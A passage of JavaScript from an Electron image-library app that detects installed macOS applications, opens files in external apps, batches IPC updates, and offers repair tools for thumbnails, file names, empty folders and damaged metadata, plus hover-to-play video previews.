							let file = fs.readFileSync(`${appPath}/Contents/Info.plist`, "utf8");
							let iconName = parseIcns(file) || "AppIcon.icns";
							try {
								if (!iconName.endsWith(".icns")) iconName = `${iconName}.icns`;
							}
							catch (err) {
								// electronLog.error(err.stack || err);
								console.error(appPath);
							}
							// console.time(`${appPath}-icon`)

							ipcRenderer.invoke('nativeImage.getFileThumbnailBase64', { filePath: `${appPath}/Contents/Resources/${iconName}`, size: 16 }).then(function(base64) { 
								if (base64) {
									let buffer = decodeBase64Image(base64).data;
									fs.writeFile(outPath, buffer, function () {});
								}
							}, function(err) {
								// electronLog.error(err.stack || err);
							})
							ipcRenderer.invoke('nativeImage.getFileThumbnailBase64', { filePath: `${appPath}/Contents/Resources/${iconName}`, size: 32 }).then(function(base64) { 
								if (base64) {
									let buffer = decodeBase64Image(base64).data;
									fs.writeFile(outPath2, buffer, function () {});
								}
							}, function(err) {})
						}

						if (appNameLower.indexOf("sketch.app") > -1) { installedApplications.sketch.isInstalled = true; }
						else if (appNameLower.indexOf("figma.app") > -1) { installedApplications.figma.isInstalled = true; }
						else if (appNameLower.indexOf("itunes.app") > -1) { installedApplications.itunes.isInstalled = true; }

						else if (appNameLower.indexOf("powerpoint") > -1) { installedApplications.powerpoint.isInstalled = true; }
						else if (appNameLower.indexOf("word") > -1) { installedApplications.word.isInstalled = true; }
						else if (appNameLower.indexOf("excel") > -1) { installedApplications.excel.isInstalled = true; }

						else if (appNameLower.indexOf("principle") > -1) { installedApplications.prd.isInstalled = true; }
						else if (appNameLower.indexOf("sketchup") > -1) { installedApplications.skp.isInstalled = true; }
						else if (appNameLower.indexOf("autodesk") > -1) { installedApplications.dwg.isInstalled = true; }
						else if (appNameLower.indexOf("maxon") > -1) { installedApplications.c4d.isInstalled = true; }
						else if (appNameLower.indexOf("clip studio") > -1) { installedApplications.clip.isInstalled = true; }
						else if (appNameLower.indexOf("graffle") > -1) { installedApplications.graffle.isInstalled = true; }
						else if (appNameLower.indexOf("xmind") > -1) { installedApplications.xmind.isInstalled = true; }
						else if (appNameLower.indexOf("mindnode") > -1) { installedApplications.mindnode.isInstalled = true; }
						else if (appNameLower.indexOf("photoshop") > -1) { installedApplications.photoshop.isInstalled = true; }
						else if (appNameLower.indexOf("adobe xd") > -1) { installedApplications.xd.isInstalled = true; }
						else if (appNameLower.indexOf("indesign") > -1) { installedApplications.indesign.isInstalled = true; }
						else if (appNameLower.indexOf("illustrator") > -1) { installedApplications.illustrator.isInstalled = true; }
						else if (appNameLower.indexOf("lightroom classic") > -1) { installedApplications.lightroomClassic.isInstalled = true; }
						else if (appNameLower.indexOf("lightroom") > -1) { installedApplications.lightroom.isInstalled = true; }
						else if (appNameLower.indexOf("polarr") > -1) { installedApplications.polarr.isInstalled = true; }
						else if (appNameLower.indexOf("acorn") > -1) { installedApplications.acorn.isInstalled = true; }
						else if (appNameLower.indexOf("pixelmator pro") > -1) { installedApplications.pxd.isInstalled = true; }
						else if (appNameLower.indexOf("pixelmator") > -1) { installedApplications.pixelmator.isInstalled = true; }
						else if (appNameLower.indexOf("affinity photo") > -1) { installedApplications.afphoto.isInstalled = true; }
						else if (appNameLower.indexOf("affinity designer") > -1) { installedApplications.afdesign.isInstalled = true; }
						else if (appNameLower.indexOf("affinity publisher") > -1) { installedApplications.afpub.isInstalled = true; }
						else if (appNameLower.indexOf("chrome") > -1) { installedApplications.chrome.isInstalled = true; }
						else if (appNameLower.indexOf("firefox") > -1) { installedApplications.firefox.isInstalled = true; }
						else if (appNameLower.indexOf("safari") > -1) { installedApplications.safari.isInstalled = true; }

						else if (appNameLower.indexOf("keynote") > -1) { installedApplications.keynote.isInstalled = true; }
						else if (appNameLower.indexOf("pages") > -1) { installedApplications.pages.isInstalled = true; }
						else if (appNameLower.indexOf("numbers") > -1) { installedApplications.numbers.isInstalled = true; }
						else if (appNameLower.indexOf("sketches") > -1) {
							if (appNameLower.indexOf("pro") > -1) {
								installedApplications.sketches.isInstalled = true;
							}
							else {
								installedApplications.sketchesfree.isInstalled = true;
							}
						}
						else if (appNameLower.indexOf("iina") > -1) {
							installedApplications.iina.isInstalled = true;
						}
						else if (appNameLower.indexOf("vlc") > -1) {
							installedApplications.vlc.isInstalled = true;
						}
						else if (appNameLower.indexOf("quicktime") > -1) {
							installedApplications.quicktime.isInstalled = true;
						}
					}
					catch (err) {
						// electronLog.error(err.stack || err);;
					}
                });
            });
        });
    }
    catch (err) {}
}

function openWithApplicationPath(appPath, filePath, image) {
    var vidx = filePath.indexOf("?v=");
    if (vidx > -1 && filePath) {
        filePath = filePath.slice(0, vidx);
    }
    const spawnSync = require('child_process').spawnSync;
    var params = ['-a', appPath, decodeURIComponent(filePath)];
    var cp = spawnSync('open', params, {
        timeout: 10000
    });
    if (cp && cp.error) {
        process.kill(cp.pid);
    }
    RecentFileManager.addFile(image);
};

function openWithIndentifier(indentifier, filePath, image) {
    var vidx = filePath.indexOf("?v=");
    if (vidx > -1 && filePath) {
        filePath = filePath.slice(0, vidx);
    }
    const spawnSync = require('child_process').spawnSync;
    var params = ['-b', indentifier, decodeURIComponent(filePath)];
    var cp = spawnSync('open', params, {
        timeout: 10000
    });
    if (cp && cp.error) {
        process.kill(cp.pid);
    }
    RecentFileManager.addFile(image);
};

function openInNewWindow (items) {
	ipcRenderer.send('open-preview-window', {
		images: items,
		pluginModule: {
			plugins: pluginModule.plugins,
			previewExtension: {
				thumbnailPluginMap: pluginModule.previewExtension.thumbnailPluginMap,
				thumbnailPath: pluginModule.previewExtension.thumbnailPath, 
				thumbnailOptions: pluginModule.previewExtension.thumbnailOptions, 
				viewerPluginMap: pluginModule.previewExtension.viewerPluginMap, 
				viewerURL: pluginModule.previewExtension.viewerURL, 
			}
		}
	});
}

function hiddenByCurrentFilter (items) {

    if (!items || items.length === 0) return;
    let total = items.length;
    let once = 350;
    let loopCount = total / once;
    let countOfSend = 0;

    function send () {
        var start = countOfSend * once;
        var willSendItems = items.slice(start, start + once);
        countOfSend += 1;

        try {
            if (!willSendItems || willSendItems.length === 0) return;
            console.log("第 %d 更新，目前進度 %d / %d", countOfSend, willSendItems.length + (countOfSend - 1) * once, total);
            var keepItems = $bodyScope.filterData(willSendItems);
            keepItems = keepItems.filter($bodyScope.contentFilter);
            var keetItemsMap = {};
            keepItems.forEach(function (item) {
                keetItemsMap[item.id] = true;
            });
            var result = [];
            willSendItems.forEach(function (item) {
                if (!keetItemsMap[item.id]) {
                    result.push(item);
                }
            });
            if (result.length > 0) {
                var hiddenItemMap = {};
                var hiddenElements = [];
                result.forEach(function (item) {
                    var $box = $(`#box-${item.id}`);
                    if ($box.length > 0) {
                        hiddenElements.push($box[0]);
                    }
                    hiddenItemMap[item.id] = true;
                });
                
                // 从当前筛选结果移除项目
                $bodyScope.allData = $bodyScope.allData.filter((item) => {
                    return !hiddenItemMap[item.id];
                });

                if (hiddenElements.length > 0) {
                    $bodyScope.$broadcast("gl:removeItems", hiddenElements);
                    $bodyScope.showImages();
                    if ($bodyScope.currentSmartFolder) {
                        $bodyScope.currentSmartFolder.imageCount = $bodyScope.smartFolderCount($bodyScope.currentSmartFolder);
                        $bodyScope.$evalAsync();
                    }
                }
            }
            // console.timeEnd("hiddenByCurrentFilter");
        }
        catch (err) {}
        
        loop();
    }

    function loop() {
        if (countOfSend < loopCount) {
            window.requestAnimationFrame(send);
        }
    }
    loop();
}

function ayncsImagesChange (images) {
    if (!images || images.length === 0) return;
    setTimeout(() => {
        let total = images.length;
        let once = 350;
        let loopCount = total / once;
        let countOfSend = 0;

        function send () {
            var start = countOfSend * once;
            var willSendImages = images.slice(start, start + once);
            countOfSend += 1;
            console.log("第 %d 批傳送，目前進度 %d / %d", countOfSend, willSendImages.length + (countOfSend - 1) * once, total);
            // console.log(willSendImages);
            if (backgroundWindowID === undefined) {
            	ipcRenderer.send('images-change', willSendImages);
            }
            else {
            	ipcRenderer.sendTo(backgroundWindowID, 'images-change', willSendImages);
            }

            willSendImages.forEach(function(image) {
                delete image['oldName'];
                delete image['newName'];
            });
            loop();
        }

        function loop() {
            if (countOfSend < loopCount) {
                window.requestAnimationFrame(send);
            }
        }
        loop();
    }, 0);
}

function ayncsImagesRemove (images) {
    if (!images || images.length === 0) return;
    electronLog.info(`[app] Delete ${images.length} files permanently`);
    setTimeout(() => {
        let total = images.length;
        let once = 50;
        let loopCount = total / once;
        let countOfSend = 0;

        function send () {
            var start = countOfSend * once;
            var willSendImages = images.slice(start, start + once);
            countOfSend += 1;
            var imageIdString = "";
            willSendImages.forEach(function(r) {
                if (r.id) {
                    imageIdString += r.id + ",";
                }
            });
            if (backgroundWindowID === undefined) {
            	ipcRenderer.send('empty-trash', imageIdString);
            }
            else {
            	ipcRenderer.sendTo(backgroundWindowID, 'empty-trash', imageIdString);
            }
            loop();
        }

        function loop() {
            if (countOfSend < loopCount) {
                window.requestAnimationFrame(send);
            }
        }
        loop();
    }, 0);
}

function ayncsImagesGenerateThumbnail (images) {
    if (!images || images.length === 0) return; 
    setTimeout(() => {
        let total = images.length;
        let once = 300;
        let loopCount = total / once;
        let countOfSend = 0;

        function send () {
            var start = countOfSend * once;
            var willSendImages = images.slice(start, start + once);
            countOfSend += 1;
            console.log("第 %d 批傳送，目前進度 %d / %d", countOfSend, willSendImages.length + (countOfSend - 1) * once, total);
            if (backgroundWindowID === undefined) {
            	ipcRenderer.send('regenerate-thumbnail', willSendImages);
            }
            else {
            	ipcRenderer.sendTo(backgroundWindowID, 'regenerate-thumbnail', willSendImages);
            }
            loop();
        }

        function loop() {
            if (countOfSend < loopCount) {
                window.requestAnimationFrame(send);
            }
        }
        loop();
    }, 0);
}

function ayncsImagesGeneratePalette (images) {
    if (!images || images.length === 0) return; 
    setTimeout(() => {
        let total = images.length;
        let once = 300;
        let loopCount = total / once;
        let countOfSend = 0;

        function send () {
            var start = countOfSend * once;
            var willSendImages = images.slice(start, start + once);
            countOfSend += 1;
            console.log("第 %d 批傳送，目前進度 %d / %d", countOfSend, willSendImages.length + (countOfSend - 1) * once, total);
            if (backgroundWindowID === undefined) {
            	ipcRenderer.send('regenerate-palette', willSendImages);
            }
            else {
            	ipcRenderer.sendTo(backgroundWindowID, 'regenerate-palette', willSendImages);
            }
            loop();
        }

        function loop() {
            if (countOfSend < loopCount) {
                window.requestAnimationFrame(send);
            }
        }
        loop();
    }, 0);
}



var updateWindowProgressBar = throttle((progress)  => {
	try {
		if (currentWindow && !currentWindow.isDestroyed()) {
			currentWindow.setProgressBar(progress);
		}
	}
	catch (err) {}
}, 333, true);

function hashFnv32a(str, asString, seed) {
    var i, l,
        hval = (seed === undefined) ? 0x811c9dc5 : seed;
    for (i = 0, l = str.length; i < l; i++) {
        hval ^= str.charCodeAt(i);
        hval += (hval << 1) + (hval << 4) + (hval << 7) + (hval << 8) + (hval << 24);
    }
    if ( asString ){
        return ("0000000" + (hval >>> 0).toString(16)).substr(-8);
    }
    return hval >>> 0;
}
const FixUtils = {};

FixUtils.openContextMenu = function () {
    var contextMenu = new Menu();
    contextMenu.append(new MenuItem({
        label: i18n.__("context.fixUtils.fixThumbnail"),
        click: function() { 
            FixUtils.fixThumbnail();
        }
    }));
    
    // 修复无效文名
    contextMenu.append(new MenuItem({
        label: i18n.__("context.fixUtils.fixFileName"),
        click: function() { 
            FixUtils.fixFileName($bodyScope.allData);
        }
    }));
    // 清除无效文件夹
    contextMenu.append(new MenuItem({
        label: i18n.__("context.fixUtils.fixEmptyFolder"),
        click: function() { 
            FixUtils.clearEmptyFolder();
        }
    }));
    // 如果路徑沒有 metadata.json 就重新製作
    contextMenu.append(new MenuItem({
        label: "Repair damaged metadata.json files",
        click: function() { 
            FixUtils.fixDamagedMetadata($bodyScope.selected);
        }
    }));
    contextMenu.popup(currentWindow);
};

FixUtils.fixThumbnail = function () {
	electronLog.info(`[app] Fix selected files without thumbnails...`);
    var imageDir = decodeURIComponent($bodyScope.imagesDir);
    var needChangeNames = [];
    var needRegenerates = [];
    $bodyScope.selected.forEach(function (image) {
        try {
            var infoPath = `${imageDir}/${image.id}.info/`;
            var files = fs.readdirSync(infoPath);
            if (files.length < 2) {
                electronLog.info(`[app] The folder has no content: ${infoPath}`);
                return;
            }
            var file = files.filter(function (file) {
                return !file.endsWith("_thumbnail.png") && file.indexOf("metadata") === -1 && file.indexOf("DS_Store") === -1 && file.indexOf(image.ext) > -1
            })[0];
            if (file) {
                var fileName = file.split('.').slice(0, -1).join('.');
                var imageName = image.name;
                // case1: 文件名称与 metadata.json 记录的不同，重新校正名称，以文件名称为主
                if (fileName !== imageName) {
                    if (fileName !== decodeURIComponent(fileName)) {
                        image.name = sanitize(decodeURIComponent(fileName)).replace("://", "");
                        var finalPath = `${infoPath}/${file.replace(fileName, decodeURIComponent(sanitize(fileName)).replace("://", ""))}`;
                        try {
                            fs.renameSync(`${infoPath}/${file}`, finalPath);
                        }
                        catch (err) {

                        }
                    }
                    else {
                        image.name = fileName;
                    }
                    $bodyScope.updateItemView(image);
                    currentWindow.webContents.send("thumbnail-generated", image);
                    needChangeNames.push(image);
                    electronLog.info(`[app] The name differs from the record and is renamed: [${imageName} > ${image.name}]`);
                }
            }
            else {
                electronLog.info(`[app] File does not exist: ${infoPath}`);
            }
            // case2: 需要 Thumbnail 但缩略图已消失，重新制作缩略图
            if (!image.noThumbnail) {
                var thumbnailPath = FileUrlHelper.getThumbnailPath(image);
                if (!fs.existsSync(thumbnailPath)) {
                    needRegenerates.push(image);
                    electronLog.info(`[app] Thumbnail file missed, regenerate new thumbnail: ${infoPath}`);
                }
            }
        }
        catch (err) {
            electronLog && electronLog.error(err.stack || err);
        }
    });

    if (needRegenerates.length > 0) {
        ipcRenderer.send('regenerate-thumbnail', needRegenerates);
    }

    if (needChangeNames.length > 0) {
        $bodyScope.updateSelection();
        ayncsImagesChange(needChangeNames);
    }
};

FixUtils.fixFileName = function (items) {
	electronLog.info(`[app] Scanning files with invalid filenames...`);
    var changed = [];
    for (var i = 0; i < items.length; i++) {
        var image = items[i];
        if (image && image.name && image.name !== " ") {
            var fixName = sanitize(image.name).trim().substr(0, 250);
            // 名稱含有異常符號或太長
            if (fixName !== image.name) {
                image.oldName = image.name;
                image.name = fixName;
                image.newName = fixName;
                $bodyScope.updateItemView(image);
                changed.push(image);
            }
        }
    }
    if (changed.length > 0) {
        electronLog.info(`[app] Scan finished, found ${changed.length} files, Start fixing...`);
        console.log(changed);
        ayncsImagesChange(changed);
    }
    else {
        swal({
            title: i18n.__("dialog.fixUtils.fixName.noResult.title"),
            html: i18n.__("dialog.fixUtils.fixName.noResult.desc"),
            showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
            width: 400,
            confirmButtonColor: "#1373FB", // 1373FB DA4945
            cancelButtonColor: "#777777",
            confirmButtonText: i18n.__("general.ok")
        }).then(function () {});
        electronLog.info(`[app] No invalid files`);
    }
};

FixUtils.clearEmptyFolder = function () {
	function withoutCacheCheck(callback) {
        // 此功能禁止使用缓存状态进行，需要先强制重新载入
        if ($bodyScope.usingCache) {
            swal({
                title: i18n.__("dialog.fixUtils.removeEmptyFolder.reload.title"),
                html: i18n.__("dialog.fixUtils.removeEmptyFolder.reload.desc"),
                showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                confirmButtonColor: "#1373FB", // 1373FB DA4945
                cancelButtonColor: "#777777",
                confirmButtonText: i18n.__("dialog.fixUtils.removeEmptyFolder.reload.button"),
                cancelButtonText:
                i18n.__("general.cancel"),
            }).then(function () {
                IPCHelper.send('reload-without-cache');
            });
        }
        else {
            if (callback) callback();
        }
    };

    // 此功能禁止使用缓存状态进行，需要先强制重新载入
    withoutCacheCheck(function () {

        electronLog.info(`[app] Check invalid content...`);

        var removeItems = [];
        var moveToTrashItems = [];
        var imageDir = decodeURIComponent($bodyScope.imagesDir);
        fs.readdir(imageDir, function(err, files) {

            $bodyScope.fixUtils.currentEmptyfolderRemoved = 0;
            $bodyScope.fixUtils.fixingCurr = 0;
            $bodyScope.fixUtils.fixingTotal = files.length;
            $bodyScope.fixUtils.isFixing = true;
            $bodyScope.$evalAsync();

            let cbs = files.map(function (file) {
                return function (callback) {
                    let infoPath = path.normalize($bodyScope.libraryPath + "/images/" + file);
                    var itemId = file.replace(".info", "");
                    let item = $bodyScope.itemMappings[itemId];
                    if (!item) {
                        if (file !== ".DS_Store" && !fs.existsSync(path.normalize(`${infoPath}/metadata.json`))) {
                            removeItems.push(itemId);
                            electronLog.info(`[app] ${infoPath} is not exists`);
                        }
                        callback();
                        $bodyScope.fixUtils.fixingCurr++;
                        // $bodyScope.$evalAsync();
                    }
                    else {
                        let rawPath = FileUrlHelper.getRawPath(item);
                        fs.exists(rawPath, function (isExists) {
                            if (!isExists) {
                                // case1: 資料夾根本不存在
                                if (!fs.existsSync(infoPath)) {
                                    removeItems.push(itemId);
                                    electronLog.info(`[app] ${infoPath} is not exists`);
                                }
                                else {
                                    let containsFiles = fs.readdirSync(infoPath);
                                    containsFiles = containsFiles.filter(function (p) {
                                    	return p !== ".DS_Store";
                                    });
                                    let correctNumber = 3;
                                    if (item.noThumbnail) { correctNumber = 2; }
                                    // case 2: 缺少檔案
                                    if (containsFiles.length <= 1) {
                                        if (!$bodyScope.itemMappings[itemId]) {
                                            removeItems.push(itemId);
                                            electronLog.info(`[app] ${infoPath} is empty`);
                                        }
                                        
                                        else {
                                            if (!item.isDeleted) {
                                                moveToTrashItems.push(item);
                                                electronLog.info(`[app] ${rawPath} is not exists`);
                                            }
                                        }
                                    }
                                    // case 3: 原檔案消失
                                    else if (!fs.existsSync(rawPath)) {
                                    // else if (containsFiles.length < correctNumber) {
                                        if (!item.isDeleted) {
                                            moveToTrashItems.push(item);
                                            electronLog.info(`[app] ${rawPath} is not exists`);
                                        }
                                    }
                                }
                            }
                            callback();
                            $bodyScope.fixUtils.fixingCurr++;
                            $bodyScope.$evalAsync();
                        });
                    }
                }
            });

            const async = require('async');
            async.parallelLimit(cbs, 10, function(err, result) {
                $bodyScope.fixUtils.fixingCurr = 0;
                $bodyScope.fixUtils.fixingTotal = 0;
                $bodyScope.fixUtils.isFixing = false;

                let total = removeItems.length + moveToTrashItems.length;

                if (total === 0) {
                    swal({
                        title: i18n.__("dialog.fixUtils.removeEmptyFolder.noResult.title"),
                        html: `${i18n.__("dialog.fixUtils.removeEmptyFolder.noResult.desc1")} ${total} ${i18n.__("dialog.fixUtils.removeEmptyFolder.noResult.desc2")}`,
                        showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        confirmButtonColor: "#1373FB", // 1373FB DA4945
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("general.ok")
                    }).then(function () {});
                }
                else {
                    swal({
                        title: i18n.__("dialog.fixUtils.removeEmptyFolder.hasResult.title"),
                        html: `${i18n.__("dialog.fixUtils.removeEmptyFolder.hasResult.desc1")} ${total} ${i18n.__("dialog.fixUtils.removeEmptyFolder.hasResult.desc2")}`,
                        showCloseButton: false, showCancelButton: true, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                        width: 400,
                        confirmButtonColor: "#F23459", // 1373FB DA4945
                        cancelButtonColor: "#777777",
                        confirmButtonText: i18n.__("dialog.fixUtils.removeEmptyFolder.hasResult.button"),
                        cancelButtonText: i18n.__("general.cancel"),
                    }).then(function () {

                        if (moveToTrashItems.length > 0) {
                            let now = Date.now();
                            moveToTrashItems.forEach(function (item) {
                                item.deletedTime = now;
                                item.isDeleted = true;
                                $bodyScope.updateFilterCounts(item, -1, now);
                            });
                            ayncsImagesChange(moveToTrashItems);
                            hiddenByCurrentFilter(moveToTrashItems);

                            $bodyScope.calculateImageBinding({ ignoreSort: true }, function() {
                                $bodyScope.updateSelection();
                            });
                        }

                        if (removeItems.length > 0) {
                            var imageIdString = removeItems.join(",");
                            IPCHelper.send('remove-empty-folders', imageIdString);
                            $bodyScope.fixUtils.removeEmptyFolderProgress = 0;
                            $bodyScope.fixUtils.currentEmptyfolderRemoved = 0;
                            $bodyScope.fixUtils.emptyFolderRemoved = removeItems.length;
                            $bodyScope.fixUtils.isCleaningEmptyFolders = true;
                        }

                        $bodyScope.$evalAsync();
                    });
                }
            });
        });
    });
};

FixUtils.fixDamagedMetadata = function () {

    let metadataPaths = [];
    let changed = [];
    let infoPaths = fs.readdirSync($bodyScope.libraryPath + "/images/");
    infoPaths.map(function (pathname) {
        if (!pathname || pathname === ".DS_Store") return;
        metadataPaths.push(path.normalize($bodyScope.libraryPath + "/images/" + pathname + "/metadata.json"));
    });
    electronLog.info(`[app] Scanning ${ metadataPaths.length} files metadata.json...`);
    let cbs =  metadataPaths.map(function (metadataPath) {
        return function (callback) {
            try {
                // let metadataPath = FileUrlHelper.getMetadataPath(item);
                fs.exists(metadataPath, function (isExists) {
                	// 狀況一、metadata.json 消失
                    if (!isExists) {
                        try {
                            electronLog.info(`[app] ${metadataPath} is missing, rebuild again...`);
                            let infoPath = metadataPath.replace("metadata.json", "");
                            let infoFiles = fs.readdirSync(infoPath);
                            infoFiles = infoFiles.filter(function (name) {
                                if (name === ".DS_Store") return false;
                                if (name.indexOf("_thumbnail.png") > -1) return false;
                                if (name.indexOf(".json") > -1) return false;
                                let ext = path.extname(name).replace(".", "");
                                if (EagleConfig.SUPPORT_FORMATS[ext.toLowerCase()]) {
                                    return true;
                                }
                                return false;
                            });
                            if (infoFiles.length > 0) {
                                let rawPath = infoPath + infoFiles[0];
                                let itemId = infoPath.split(".info")[0].split(path.normalize("images/"))[1];
                                let item;
                                if ($bodyScope.itemMappings[itemId]) {
                                    item = $bodyScope.itemMappings[itemId];
                                    ayncsImagesChange([item]);
                                }
                                else {
                                    item = {
                                        id: itemId,
                                        name: path.parse(rawPath).name,
                                        ext: getExt({ path: rawPath }),
                                        modificationTime: Date.now()
                                    }
                                    ayncsImagesGenerateThumbnail([item]);
                                }
                                changed.push(metadataPath);
                            }
                        }
                        catch (err) {
                            electronLog && electronLog.error(err.stack || err);
                        }
                    }
                    else {
                    	// 狀況二、metadata.json 無法解析，有些东西没显示在画面上
                    	let itemId = metadataPath.split(".info")[0].split(path.normalize("images/"))[1];
                    	let item = $bodyScope.itemMappings[itemId];
                    	let jsonStr;
                    	if (!item) {
                    		try {
                    			jsonStr = fs.readFileSync(metadataPath, 'utf8');
            					let itemObject = JSON.parse(jsonStr);
                    		}
                    		catch (err) {
                    			try {
                                    if (err.message.indexOf("in JSON at position ") > -1) {
                                        electronLog.info(`[app] ${metadataPath} is damaged, try to fix...`);
                        				let position = err.message.split("in JSON at position ")[1];
                        				if (position) {
                        					position = parseInt(position);
                        					if (position > 0) {
                        						let newJSONStr = jsonStr.substr(0, position);
                                                try {
                                                    let newObject = JSON.parse(newJSONStr);
                                                    ayncsImagesChange([newObject]);
                                                    ayncsImagesGenerateThumbnail([newObject]);
                                                    electronLog.info(`[app] ${metadataPath} has been fixed.`);
                                                }
                                                catch (err) {
                                                    electronLog.info(`[app] ${metadataPath} can not fixed.`);
                                                    electronLog.info(`[app] ${jsonStr}`);
                                                }
                        					}
                        				}
                                    }
                    			}
                    			catch (err) {}
                    		}
                    	}
                    }
                    
                    callback();
                    $bodyScope.fixUtils.fixingCurr++;
                    $bodyScope.$evalAsync();
                });
            }
            catch (err) {
                callback();
            }
        }
    });
    console.time("Scan missing metadata.json");

    $bodyScope.fixUtils.fixingCurr = 0;
    $bodyScope.fixUtils.fixingTotal = cbs.length;
    $bodyScope.fixUtils.isFixing = true;
    $bodyScope.$evalAsync();

    const async = require('async');
    async.parallelLimit(cbs, 2, function(err, result) {
        console.timeEnd("Scan missing metadata.json");
        electronLog.info(`[app] Scan finished, found ${changed.length} files`);
        $bodyScope.fixUtils.fixingCurr = 0;
        $bodyScope.fixUtils.fixingTotal = 0;
        $bodyScope.fixUtils.isFixing = false;
        $bodyScope.$evalAsync();
        if (changed.length > 0) {
            swal({
                title: "Finished",
                html: `${changed.length} hidden files found and repaired.`,
                showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                confirmButtonColor: "#1373FB", // 1373FB DA4945
                cancelButtonColor: "#777777",
                confirmButtonText: "OK",
            }).then(function () {});
        }
        else {
            swal({
                title: "Finished",
                html: "Did not find any files that need to be repaired.",
                showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
                width: 400,
                confirmButtonColor: "#1373FB", // 1373FB DA4945
                cancelButtonColor: "#777777",
                confirmButtonText: "OK",
            }).then(function () {});
        }
    });
};

ipcRenderer.on("remove-empty-folder-item", function () {
    $bodyScope.fixUtils.currentEmptyfolderRemoved++;
    if ($bodyScope.fixUtils.currentEmptyfolderRemoved > $scope.fixUtils.emptyFolderRemoved) {
        $bodyScope.fixUtils.currentEmptyfolderRemoved = $scope.fixUtils.emptyFolderRemoved;
    }
    $bodyScope.$evalAsync();
});

ipcRenderer.on("remove-empty-folder-item-done", function (event, params) {
    swal({
        title: `Cleanup Completed`,
        html: `${params.count} invalid content has been deleted.`,
        showCloseButton: false, showCancelButton: false, allowOutsideClick: false, focusConfirm: true, focusCancel: false, padding: 24,
        width: 360,
        confirmButtonColor: "#1373FB", // 1373FB DA4945
        cancelButtonColor: "#777777",
        confirmButtonText: i18n.__("general.ok")
    }).then(function () {});
    $bodyScope.fixUtils.isCleaningEmptyFolders = false;
    $timeout(function () {
        $scope.fixUtils.removeEmptyFolderProgress = 0;
        $scope.fixUtils.currentEmptyfolderRemoved = 0;
        $scope.fixUtils.emptyFolderRemoved = 0;
        $scope.fixUtils.isCleaningEmptyFolders = false;
        IPCHelper.send('reload-without-cache');
    }, 500);
    $bodyScope.$evalAsync();
});
// MP4 文件悬停自动播放
var mouseoverVideoTimeout;
var updateVideoCursorInterval;
$("#box-container").on('mouseenter', '.box.ext-ts .thumbnail, .box.ext-3gp .thumbnail, .box.ext-360 .thumbnail, .box.mp4 .thumbnail, .box.m4v .thumbnail, .box.mkv .thumbnail, .box.avi .thumbnail, .box.wmv .thumbnail, .box.mpg .thumbnail, .box.webm .thumbnail, .box.mov .thumbnail', function(event) {
    event.stopPropagation();

    // 避免拖拽时重复触发又在背景无限播放
    if (event.which === 1) return;
    if (rectSelecting) return;
    if ($bodyScope.preferences.video.hoverPlay === "false") return;

    var $scope = angular.element("body").scope();
    var $box = $(".box").has(this);
    var image = $scope.getItemByElement($box[0]);

    if (!image) return;
    if (image.noPreview) return;

    // 悬停 500ms 在开始播放
    clearTimeout(mouseoverVideoTimeout);
    clearInterval(updateVideoCursorInterval);
    mouseoverVideoTimeout = setTimeout(function () {
        var $videos = $box.find("video");
        if ($videos.length > 0) {
            $videos[0].load();
            $videos[0].pause();
            $videos[0].src = "";
            $videos.remove();
            return;
        }
        var $image = $box.find("img");
        $box.find(".video-progress-bar").remove();
        var $progressbar = $('<div class="video-progress-bar"><div class="current"></div></div>')
        var $currentTime = $(`<div class="current-time">00:00</div>`);
        var $muteToggle = $('<div class="mute-toggle"></div>');
        var muted = localStorage["eagle.list.video.muted"] != 'false';
        if (muted) {
            $muteToggle.addClass("muted");
        }
        else {
            $muteToggle.removeClass("muted");
        }
        console.log(muted);
        var video = $('<video/>', {
            id: 'video',
            src: $bodyScope.getRawUrl(image),
            type: 'video/mp4',
            controls: false,
            autoplay: true,
            muted: muted,
            draggable: true,
            loop: true
        });

        var $controls = $('<div class="controls"></div>');
        $controls.append($currentTime);
        $controls.append($muteToggle);
        $controls.hide();

        var volume = localStorage.getItem("eagle.videoPlayer.volume") || 100;
        video[0].volume = parseInt(volume) / 100;

        if ($box.find("video").length === 0) {

            video.on('dragstart', function (event) {
                event.preventDefault();
                onDragStartContainer(event);
            });

            video.on('drag', function () {
                event.preventDefault();
                onImageDrag(event);
            });

            video.on('dragend', function () {
                event.preventDefault();
                onDragEndContainer(event);
            });

            video.on('mouseover', function (event) {
                event.stopPropagation();
            });

            var autoPlayTimeout;
            var currentTimeTimeout;
            video.on('mousemove', throttle(function (event) {
                if (rectSelecting) return;
                mouseX = event.offsetX;
                var duration = video.get(0).duration;
                var mouseTime = (duration * mouseX / $image.width());
                var width = mouseX / $image.width() * 100;

                $progressbar.find(".current").width("calc(" + width + "%" + " - 2px)");
                $currentTime.addClass("show");
                $controls.show();
                clearTimeout(currentTimeTimeout);
                currentTimeTimeout = setTimeout(() => {
                	$currentTime.removeClass("show");
                }, 600);

                mouseTime = Math.round(mouseTime * 100) / 100;
                if (mouseTime && !isNaN(mouseTime) && isFinite(mouseTime)) {
                    videoHelper.setCurrentTime(video.get(0), parseFloat(mouseTime));
                    video.get(0).pause();
                    clearTimeout(autoPlayTimeout);
                    autoPlayTimeout = setTimeout(function () {
                        try {
                            if (document.body.contains(video.get(0))) {
                                video.get(0).play();
                            }
                        } catch (err) {
                        }
                    }, 200);
                }
            }, 50, true));
            var ratio = image.width / image.height;
            var ratio2 = $image.width() / $image.height();
            if (ratio > ratio2) {
                video.height($image.height());
                video.width();
            }
            else {
                video.width($image.width());
                video.height($image.width() / ratio);
            }
            video.hide();

            $muteToggle.on("mousedown", function (event) {
                event.stopPropagation();
            });

            $muteToggle.on("dblclick", function (event) {
                event.stopPropagation();
            });

            $muteToggle.on("mouseover", function (event) {
                event.stopPropagation();
            });

            $muteToggle.on("click", function (event) {
                console.log("click");
                event.stopPropagation();
                video.get(0).muted = !video.get(0).muted;
                muted = video.get(0).muted;
                if (muted) {
                    $muteToggle.addClass("muted");
                }
                else {
                    $muteToggle.removeClass("muted");
                }
                localStorage.setItem("eagle.list.video.muted", muted);
